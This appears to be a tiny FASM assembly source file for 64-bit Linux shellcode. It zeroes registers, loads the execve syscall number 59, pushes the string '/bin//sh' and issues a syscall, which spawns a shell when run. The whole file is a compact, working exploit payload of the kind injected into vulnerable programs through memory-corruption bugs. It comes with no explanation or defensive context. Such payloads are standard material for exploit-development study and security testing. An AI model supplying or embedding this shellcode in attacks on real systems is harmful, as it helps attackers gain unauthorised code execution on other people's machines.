;; fasm shellcode.fasm shellcode.fasm.x86

format binary
use64

shell:
    xor     esi, esi
    mul     esi
    mov     al, 59
    mov     rbx, '/bin//sh'
    push    rdx
    push    rbx
    push    rsp
    pop     rdi
    syscall